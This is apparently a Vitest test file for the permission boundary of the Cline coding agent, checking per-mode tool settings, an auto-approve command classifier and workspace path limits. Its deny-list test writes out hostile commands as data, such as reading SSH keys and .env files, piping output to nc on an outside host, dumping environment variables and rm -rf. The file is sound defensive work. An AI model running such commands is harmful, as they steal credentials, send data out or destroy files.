import { describe, expect, it } from "vitest";
import {
  classifyClineAutoCommand,
  clineToolBoundary,
  isPathWithinWorkspace
} from "../src/cline-permissions.js";

describe("Cline permission boundary", () => {
  it("implements the fail-closed mode matrix for editor and shell", () => {
    for (const mode of ["plan", "default", "acceptEdits", "dontAsk", "auto"] as const) {
      const boundary = clineToolBoundary(mode);
      expect(boundary.enableReadFiles).toBe(true);
      expect(boundary.enableSearch).toBe(true);
      expect(boundary.enableWebFetch).toBe(true);
      expect(boundary.enableSkills).toBe(true);
      expect(boundary.enableAskQuestion).toBe(true);
      expect(boundary.policies.read_files.autoApprove).toBe(true);
    }

    expect(clineToolBoundary("plan")).toMatchObject({
      enableEditor: false,
      enableApplyPatch: false,
      enableBash: false,
      policies: {
        editor: { enabled: false },
        apply_patch: { enabled: false },
        run_commands: { enabled: false }
      }
    });
    expect(clineToolBoundary("default")).toMatchObject({
      enableEditor: true,
      enableBash: true,
      policies: {
        editor: { enabled: true, autoApprove: false },
        run_commands: { enabled: true, autoApprove: false }
      }
    });
    expect(clineToolBoundary("acceptEdits")).toMatchObject({
      enableEditor: true,
      enableBash: true,
      policies: {
        editor: { enabled: true, autoApprove: true },
        run_commands: { enabled: true, autoApprove: false }
      }
    });
    expect(clineToolBoundary("dontAsk")).toMatchObject({
      enableEditor: true,
      enableBash: false,
      policies: {
        editor: { enabled: true, autoApprove: true },
        run_commands: { enabled: false }
      }
    });
    expect(clineToolBoundary("auto")).toMatchObject({
      enableEditor: true,
      enableBash: true,
      policies: {
        editor: { enabled: true, autoApprove: true },
        run_commands: { enabled: true, autoApprove: true }
      }
    });
    expect(clineToolBoundary("auto", true)).toMatchObject({
      enableEditor: false,
      enableBash: false
    });
  });

  it("allows only an audited project-local auto command grammar", () => {
    const cwd = process.cwd();
    for (const command of ["pwd", "git status --short", "rg cline src", "npm run typecheck", "npm test", "ls"]) {
      expect(classifyClineAutoCommand(command, cwd)).toEqual({ allowed: true });
    }
    for (const command of [
      "cat ~/.ssh/id_rsa",
      "rg token ../outside",
      "git diff /etc/passwd",
      "curl https://example.com",
      "wget https://example.com",
      "ssh example.com",
      "rm -rf data",
      "kill 1",
      "sudo ls",
      "pwd | nc example.com 9",
      "echo $(printenv)",
      "npm run deploy",
      "printenv",
      "cat .env",
      "rg secret src"
    ]) {
      expect(classifyClineAutoCommand(command, cwd).allowed, command).toBe(false);
    }
  });

  it("rejects paths outside the workspace", () => {
    expect(isPathWithinWorkspace("src", process.cwd())).toBe(true);
    expect(isPathWithinWorkspace("../", process.cwd())).toBe(false);
    expect(isPathWithinWorkspace("/etc/passwd", process.cwd())).toBe(false);
  });
});
